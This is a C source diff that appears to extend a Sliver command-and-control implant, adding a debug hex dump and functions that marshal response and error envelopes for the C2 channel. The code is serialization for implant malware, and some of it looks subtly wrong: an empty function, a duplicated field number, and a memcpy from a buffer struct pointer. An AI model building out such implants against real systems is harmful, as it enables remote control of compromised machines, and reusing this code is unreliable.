@@ -337,6 +337,8 @@ BOOL WriteEnvelope
 	PHTTP_RESP pResp = NULL;
 	BOOL Result = FALSE;
 
+	wprintf(L"Write Envelope:\n");
+	HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
 	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
 	pCipherText = SessionEncrypt(pSliverClient, pMarshalledEnvelope->pBuffer, pMarshalledEnvelope->cbBuffer, &cbCipherText);
 	
@@ -477,4 +479,75 @@ PBUFFER MarshalSliverReq
 )
 {
 
+}
+
+PBUFFER MarshalSliverResp
+(
+	_In_ PSLIVER_RESP pSliverResp
+)
+{
+	PPBElement ElementList[4];
+	PPBElement pFinalElement = NULL;
+	PBUFFER pResult = NULL;
+	
+	SecureZeroMemory(ElementList, sizeof(ElementList));
+	if (pSliverResp->lpErrDesc != NULL) {
+		ElementList[0] = CreateBytesElement(pSliverResp->lpErrDesc, lstrlenA(pSliverResp->lpErrDesc), 1);
+	}
+
+	if (pSliverResp->Async) {
+		ElementList[1] = CreateVarIntElement(pSliverResp->Async, 2);
+	}
+
+	if (lstrlenA(pSliverResp->szBeaconID) > 0) {
+		ElementList[2] = CreateBytesElement(pSliverResp->szBeaconID, lstrlenA(pSliverResp->szBeaconID), 8);
+	}
+
+	if (lstrlenA(pSliverResp->szSessionID) > 0) {
+		ElementList[3] = CreateBytesElement(pSliverResp->szSessionID, lstrlenA(pSliverResp->szSessionID), 8);
+	}
+
+	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
+	pResult = ALLOC(sizeof(BUFFER));
+	pResult->cbBuffer = pFinalElement->cbMarshalledData;
+	pResult->pBuffer = pFinalElement->pMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pFinalElement->cbMarshalledData = 0;
+
+	FreeElement(pFinalElement);
+	return pResult;
+}
+
+PENVELOPE CreateErrorRespEnvelope
+(
+	_In_ LPSTR lpErrorDesc,
+	_In_ DWORD dwFieldIdx,
+	_In_ DWORD dwEnvelopeID
+)
+{
+	PBUFFER pMarshalledResp = NULL;
+	PSLIVER_RESP pSliverResp = NULL;
+	PBUFFER pMarshalledFieldIdx = NULL;
+	DWORD cbMarshalledFieldIdx = 0;
+	PENVELOPE pResult = NULL;
+
+	pSliverResp = ALLOC(sizeof(SLIVER_RESP));
+	pSliverResp->lpErrDesc = DuplicateStrA(lpErrorDesc, 0);
+	pMarshalledResp = MarshalSliverResp(pSliverResp);
+
+	pMarshalledFieldIdx = MarshalVarInt(dwFieldIdx, &cbMarshalledFieldIdx);
+	pResult = ALLOC(sizeof(ENVELOPE));
+	pResult->pData = ALLOC(sizeof(BUFFER));
+	pResult->pData->cbBuffer = cbMarshalledFieldIdx + pMarshalledResp->cbBuffer;
+	pResult->pData->pBuffer = ALLOC(pResult->pData->cbBuffer);
+	memcpy(pResult->pData->pBuffer, pMarshalledFieldIdx, cbMarshalledFieldIdx);
+	memcpy(pResult->pData->pBuffer + cbMarshalledFieldIdx, pMarshalledResp->pBuffer, pMarshalledResp->cbBuffer);
+	pResult->uID = dwEnvelopeID;
+
+	FreeBuffer(pMarshalledFieldIdx);
+	FreeBuffer(pMarshalledResp);
+	FREE(pSliverResp->lpErrDesc);
+	FREE(pSliverResp);
+
+	return pResult;
 }
